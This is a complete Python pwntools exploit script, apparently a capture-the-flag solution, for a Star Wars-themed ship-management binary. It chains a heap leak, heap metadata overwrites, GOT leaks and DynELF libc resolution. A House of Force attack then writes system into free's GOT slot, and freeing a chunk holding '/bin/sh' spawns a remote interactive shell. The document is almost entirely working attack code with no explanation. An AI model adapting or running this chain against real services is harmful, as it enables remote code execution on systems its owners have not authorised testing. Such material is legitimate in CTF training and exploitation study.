from pwn import *
import re
import sys

# constants and function to simulate unsigned operations
M32 = 0xffffffffL
conn = None
falcon_id_global = 0

def m32(n):
    return n & M32
def madd(a, b):
    return m32(a+b)
def msub(a, b):
    return m32(a-b)

def shift_if_neg(num):
    if num > 0x7FFFFFFF:
        return num - 0x100000000
    return num

def welcome_mess():
    conn.recvuntil("time...\n")
    conn.send("\n")
    conn.recvuntil("5. Surrender_\n")

def get_heap_leak():
    conn.send("6\n")
    result = conn.recvuntil("5. Surrender_\n")
    result = result.split("\n")[0]
    heapleak = re.findall(r'\. .* -',result)[0][2:-3]
    topchunkinitialsize = re.findall(r'-  .*',result)[0][3:]
    return int(heapleak,16),int(topchunkinitialsize,16)

def get_last_ship_id():
    conn.send("4\n")
    result = conn.recvuntil("5. Surrender_\n")
    result = result.split("\n")
    lastid = None
    for line in result:
        if "Ship [" in line:
            lastid = int(re.findall(r'\[.*\]',line)[0][1:-1])
    return lastid

def create_ship(ship_type="1",pilot_name="aa"):
    conn.send("2\n")
    conn.recvuntil("vehicle_")
    conn.send(ship_type+"\n")
    conn.recvuntil("name..")
    conn.send(pilot_name+"\n")
    conn.recvuntil("5. Surrender_\n")
    return  get_last_ship_id()

def create_falcon():
    conn.send("2\n")
    conn.recvuntil("vehicle_")
    conn.send("4\n")
    conn.recvuntil("5. Surrender_\n")

def fill_bwing_with_addr(shipid,addr):
    conn.send("3\n")
    conn.recvuntil("index:")
    conn.send(str(shipid) + "\n")
    for i in range(6):
        conn.recvuntil("charge:")
        conn.send(str(addr) + "\n")
    conn.recvuntil("name..")
    conn.send(p32(addr) + p32(addr) + "\n")
    conn.recvuntil("5. Surrender_\n")

def fill_xwing_with_addr(shipid,addr):
    conn.send("3\n")
    conn.recvuntil("index:")
    conn.send(str(shipid) + "\n")
    for i in range(6):
        conn.recvuntil("charge:")
        conn.send(str(addr) + "\n")
    conn.recvuntil("name..")
    conn.send(p32(addr) + p32(addr) + "\n")
    conn.recvuntil("5. Surrender_\n")

def binsh_to_z95(shipid):
    binsh1 = shift_if_neg(1852400175) #/bin
    binsh2 = shift_if_neg(6845231) #/sh\x00
    conn.send("3\n")
    conn.recvuntil("index:")
    conn.send(str(shipid) + "\n")
    conn.recvuntil("charge:")
    conn.send(str(binsh1) + "\n")
    conn.recvuntil("charge:")
    conn.send(str(binsh2) + "\n")
    for i in range(2):
        conn.recvuntil("charge:")
        conn.send("0\n")
    conn.recvuntil("name..")
    conn.send("pilot\n")
    conn.recvuntil("5. Surrender_\n")

def xwing_overwrite(shipid,next_chunk_size,next_chunk_prev_size):
    conn.send("3\n")
    conn.recvuntil("index:")
    conn.send(str(shipid) + "\n")
    for i in range(6):
        conn.recvuntil("charge:")
        conn.send("1" + "\n")
    conn.recvuntil("name..")
    conn.send(p32(0xffffffff) + p32(next_chunk_prev_size) + p32(next_chunk_size) + "\n")
    conn.recvuntil("5. Surrender_\n")
    conn.recvuntil("5. Surrender_\n")

def free_ship(ship_id):
    conn.send("1\n")
    conn.recvuntil("fleet!")
    conn.send(str(ship_id) + "\n")
    conn.recvuntil("5. Surrender_\n")

def house_of_force_falcon(falcon_id,ffrom,fto):
    conn.send("3\n")
    conn.recvuntil("index:")
    conn.send(str(falcon_id)+"\n")
    for i in range(4):
        conn.recvuntil("charge:")
        conn.send("1" + "\n")
    conn.recvuntil("charge:")
    random_valid_addr = 0x0804E028 # otherwise examine fleet will fail
    if random_valid_addr > 0x7FFFFFFF:
        random_valid_addr -= 0x100000000
    conn.send(str(random_valid_addr) + "\n")
    conn.recvuntil("name..")
    conn.send((p32(0xffffffff) * 4) + "\n")
    conn.recvuntil("much?")
    evil_amount = msub(fto,ffrom)
    if evil_amount > 0x7FFFFFFF:
        evil_amount -= 0x100000000
    conn.send(str(evil_amount) + "\n")
    conn.recvuntil("5. Surrender_\n")

def falcon_leak(falcon_id,addr):
    conn.send("3\n")
    conn.recvuntil("index:")
    conn.send(str(falcon_id)+"\n")
    for i in range(4):
        conn.recvuntil("charge:")
        conn.send("1" + "\n")
    conn.recvuntil("charge:")
    conn.send(str(addr) + "\n")
    conn.recvuntil("name..")
    conn.send("han\n")
    conn.recvuntil("much?")
    conn.send("0\n")
    conn.recvuntil("5. Surrender_\n")
    conn.send("4\n")
    result = conn.recvuntil("Shields charge: ")
    result = conn.recvuntil("Pilot")
    conn.recvuntil("5. Surrender_\n")
    result = result[:-6]
    if len(result) == 0:
        # log.info("Leaked ZERO!")
        return '\x00'
    else:
        # log.info("Leaked: " + result[:4])
        return result[:4]

# Debug function
def print_bytes(finput):
    log.info("Leaked:")
    for i in finput:
        print hex(ord(i))
    log.info("Leak len: " + str(len(finput)))



def leak(address):
    # log.info("Leaking at: " + hex(address))
    global falcon_id_global
    if address > 0x7FFFFFFF:
        address -= 0x100000000
    leak = falcon_leak(falcon_id_global,address)
    # print_bytes(leak)
    return leak



def pwn_main():

    global conn
    global falcon_id_global

    host = sys.argv[1]
    port = int(sys.argv[2])

    conn = remote(host,port)

    welcome_mess()

    xwing_dim = 10*4
    bwing_dim = xwing_dim
    z95_dim = 8*4
    falcon_dim = 8*4
    arena_ptr = 0x0804E0A4

    # Heap leak, kindly provided..
    heap_leak, top_chunk_init_size = get_heap_leak()
    log.info("Heap leak: " + hex(heap_leak) + ", Top chunk initial dimension: " + hex(top_chunk_init_size))

    # Reaching ideal heap location
    wanted_arena = ( heap_leak & 0xFFF00000 ) + 0x100000
    bwings_needed = (wanted_arena - heap_leak) / bwing_dim
    log.info("Allocating until " + hex(wanted_arena) + " is reached, " + str(bwings_needed) + " bwings are needed.")
    prog = log.progress('Allocating padding ships..')
    for i in range(bwings_needed):
        create_ship("3")
        fill_bwing_with_addr(i,arena_ptr)
        prog.status('Allocating padding ships.. ' + str(i) + '/' + str(bwings_needed))
    prog.success('All padding ships allocated!')
    # raw_input()

    # Preparing bwings to overwrite len
    prog = log.progress('Allocating pwning ships..')
    for i in range(4):
        create_ship()
        prog.status('Allocating pwning ships.. ' + str(i) + '/' + str(3))
    prog.success('All pwning ships allocated!')
    last_ship_temp_id = get_last_ship_id()
    log.info("Last ship id: " + str(last_ship_temp_id))

    # Overwriting hs (han_solo) global variable
    fill_xwing_with_addr(get_last_ship_id()-3,arena_ptr)
    xwing_overwrite(get_last_ship_id()-2,0x15,0xffffffff)
    fill_xwing_with_addr(get_last_ship_id()-1,0xfffffffa)
    prog = log.progress('Sending pwning ship to death..')
    free_ship(get_last_ship_id()-1)
    prog.success('Pwning ship found han!')

    # conn.interactive()
    # Prepare binsh in z95 ship
    create_ship("2")
    z95_binsh_ship_id = last_ship_temp_id + 1
    log.info("Z95 ship ID to free: " + str(z95_binsh_ship_id))
    binsh_to_z95(z95_binsh_ship_id)

    # Allocating falcon ship
    create_falcon()

    # Leak got with falcon
    falcon_id = last_ship_temp_id + 2
    falcon_id_global = falcon_id
    free_in_got = 0x0804E018
    # free_in_libc = unpack(falcon_leak(falcon_id,free_in_got), 'all', 'little', False)
    free_in_libc = u32(falcon_leak(falcon_id,free_in_got))
    printf_in_got = 0x0804E010
    # printf_in_libc = unpack(falcon_leak(falcon_id,printf_in_got), 'all', 'little', False)
    printf_in_libc = u32(falcon_leak(falcon_id,printf_in_got))
    fflush_in_got = 0x0804E014
    # fflush_in_libc = unpack(falcon_leak(falcon_id,fflush_in_got), 'all', 'little', False)
    fflush_in_libc = u32(falcon_leak(falcon_id,fflush_in_got))
    getchar_in_got = 0x0804E01C
    # getchar_in_libc = unpack(falcon_leak(falcon_id,getchar_in_got), 'all', 'little', False)
    getchar_in_libc = u32(falcon_leak(falcon_id,getchar_in_got))
    fgets_in_got = 0x0804E020
    # fgets_in_libc = unpack(falcon_leak(falcon_id,fgets_in_got), 'all', 'little', False)
    fgets_in_libc = u32(falcon_leak(falcon_id,fgets_in_got))

    # Leak libc with falcon & pwntools
    d = DynELF(leak, printf_in_libc)
    log.info("Libc base found at: " + hex(d.libbase))
    system_in_libc = d.lookup('system')
    log.info("System in libc: " + hex(system_in_libc))

    # Test version with calculated offset
    # system_in_libc = printf_in_libc - 0xd100
    # log.info("System in libc: " + hex(system_in_libc))

    # House forcing with falcon ship
    current_heap = heap_leak + (4 * 4) + (bwings_needed * bwing_dim) + (4 * xwing_dim) + (1 * z95_dim)
    top_chunk_size_addr = current_heap + (1 * falcon_dim) + 4
    log.info("Falcon location: " + hex(current_heap))
    log.info("Top chunk size addr: " + hex(top_chunk_size_addr))
    where_to_jump = 0x0804E00C
    house_of_force_falcon(falcon_id,top_chunk_size_addr,where_to_jump-12)

    # Creating ship in got
    create_ship(pilot_name="ant") # messing __stack_chk_fail in got ( no problem.. )

    # Final overwriting of got
    last_ship_id = falcon_id + 1
    conn.send("3\n")
    conn.recvuntil("index:")
    conn.send(str(last_ship_id) + "\n")
    conn.recvuntil("charge:")
    conn.send("1" + "\n") # overwriting strcmp in got ( bad address is ok.. )
    conn.recvuntil("charge:")
    conn.send(str(shift_if_neg(printf_in_libc)) + "\n") # overwriting printf in got ( we need to get it right )
    conn.recvuntil("charge:")
    conn.send(str(shift_if_neg(fflush_in_libc)) + "\n") # overwriting fflush in got ( we need to get it right )
    conn.recvuntil("charge:")
    conn.send(str(shift_if_neg(system_in_libc)) + "\n") # overwriting free in got ( we need to get SYSTEM into it!!!!!! )
    conn.recvuntil("charge:")
    conn.send(str(shift_if_neg(getchar_in_libc)) + "\n") # overwriting getchar in got ( we need to get it right )
    conn.recvuntil("charge:")
    conn.send(str(shift_if_neg(fgets_in_libc)) + "\n") # overwriting fgets in got ( we need to get it right )
    conn.recvuntil("name..")
    conn.send("antani\n")
    conn.recvuntil("5. Surrender_\n")

    # Freeing (systeming..) z95 alias /bin/sh ship
    conn.send("1\n")
    conn.recvuntil("fleet!")
    conn.send(str(z95_binsh_ship_id) + "\n")

    # Shell
    conn.interactive()

if __name__ == "__main__":
    pwn_main()
